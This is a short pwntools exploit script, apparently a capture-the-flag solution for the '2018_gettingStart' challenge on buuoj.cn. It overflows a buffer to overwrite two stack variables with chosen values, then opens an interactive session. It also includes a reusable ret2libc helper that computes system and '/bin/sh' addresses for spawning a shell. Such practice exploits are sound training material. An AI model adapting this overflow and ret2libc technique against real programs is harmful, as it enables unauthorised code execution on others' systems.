from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, search, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
		search_addr = base + libc.dump(search)
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()
		search_addr = base + libc.symbols[search]

	return (base, system, binsh, search_addr)


context(os='linux', arch='amd64', log_level='debug')
binary = './2018_gettingStart'

context.binary = binary
elf = ELF(binary)
io = remote('node4.buuoj.cn',26059) if argv[1]=='r' else process(binary)
# io= gdb.debug(binary,"break *0x400699")

v5 = 0x7FFFFFFFFFFFFFFF
v6 = 0x3FB999999999999A
payload = b'a'*0x18 + p64(v5) + p64(v6)
io.sendafter(b'But Whether it starts depends on you.\n',payload)
io.interactive()